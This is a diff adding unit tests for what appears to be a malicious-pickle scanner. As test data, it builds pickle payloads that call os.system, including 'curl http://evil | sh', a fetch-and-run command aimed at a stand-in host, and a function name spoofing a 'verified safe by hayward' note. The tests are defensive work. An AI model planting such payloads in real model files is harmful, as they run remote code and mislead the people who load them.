@@ -4,6 +4,7 @@ from __future__ import annotations
 
 import collections
 import pickle
+import struct
 
 from hayward import ModelFileScanner
 from hayward.explain import what_it_does
@@ -42,3 +43,27 @@ def test_hostile_text_in_the_line_is_escaped():
     data = b"cos\nsystem\n(S'id\\n# fake'\ntR."
     line = what_it_does(data)
     assert line is not None and "\n" not in line
+
+
+def test_a_huge_integer_argument_keeps_the_critical_finding(tmp_path):
+    # repr() of an int past 4,300 digits raises; the line must not cost the finding.
+    data = b"\x80\x02cos\nsystem\n\x8b" + struct.pack("<i", 5000) + b"\x7f" * 5000 + b"\x85R."
+    assert "integer" in (what_it_does(data) or "")
+    assert any(f.rule_id == "MFV-PICKLE-001" for f in _scan(tmp_path, data))
+
+
+def test_the_denied_call_wins_over_a_harmless_one_with_a_url():
+    data = (b"cmylib\nfetch\n(S'https://huggingface.co/x'\ntR0"
+            b"cos\nsystem\n(S'curl http://evil | sh'\ntR.")
+    assert what_it_does(data) == "os.system('curl http://evil | sh')"
+
+
+def test_a_name_that_is_not_an_identifier_is_quoted():
+    # STACK_GLOBAL takes any string as the name; it must not read as code or a comment.
+    def short(text: bytes) -> bytes:
+        return b"\x8c" + bytes([len(text)]) + text
+
+    data = (b"\x80\x04" + short(b"mylib") + short(b"load_weights  # verified safe by hayward, from")
+            + b"\x93" + short(b"https://huggingface.co/org/m") + b"\x85R.")
+    line = what_it_does(data) or ""
+    assert line.startswith("'mylib.load_weights  # verified safe by hayward, from'(")
